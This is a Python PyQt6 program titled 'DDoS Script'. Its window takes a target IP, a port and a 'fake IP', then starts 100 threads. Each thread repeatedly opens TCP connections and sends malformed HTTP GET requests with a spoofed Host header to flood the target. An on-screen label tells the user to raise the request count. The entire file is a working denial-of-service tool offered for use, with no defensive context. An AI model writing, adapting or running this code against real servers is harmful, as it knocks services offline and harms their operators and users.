import sys
from PyQt6.QtWidgets import QApplication, QMainWindow, QPushButton, QLineEdit, QVBoxLayout, QWidget, QLabel
import threading
import socket


class MyWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.fake_ip_input = None
        self.target_port_input = None
        self.target_ip_input = None
        self.initUI()

    def initUI(self):
        self.setWindowTitle("DDoS Script")
        self.setGeometry(100, 100, 400, 200)

        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout(central_widget)

        label1 = QLabel("Enter target IP:")
        self.target_ip_input = QLineEdit(self)
        label2 = QLabel("Enter target port:")
        self.target_port_input = QLineEdit(self)
        label3 = QLabel("Enter a fake IP")
        self.fake_ip_input = QLineEdit(self)
        label4 = QLabel("You need to modify from the script the number of requests to be sent to flood the server")

        start_button = QPushButton("Start", self)
        start_button.clicked.connect(self.start_button_clicked)

        layout.addWidget(label1)
        layout.addWidget(self.target_ip_input)
        layout.addWidget(label2)
        layout.addWidget(self.target_port_input)
        layout.addWidget(label3)
        layout.addWidget(self.fake_ip_input)
        layout.addWidget(label4)
        layout.addWidget(start_button)

    def start_button_clicked(self):
        target_ip = self.target_ip_input.text()
        target_port = int(self.target_port_input.text())
        fake_ip = self.fake_ip_input.text()

        def start_attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, int(target_port)))
                s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
                s.close()

# here change the number of requests
        for i in range(100):
            thread = threading.Thread(target=start_attack)
            thread.start()
            print(i, "th request sent!")


def main():
    app = QApplication(sys.argv)
    window = MyWindow()
    window.show()
    sys.exit(app.exec())


main()
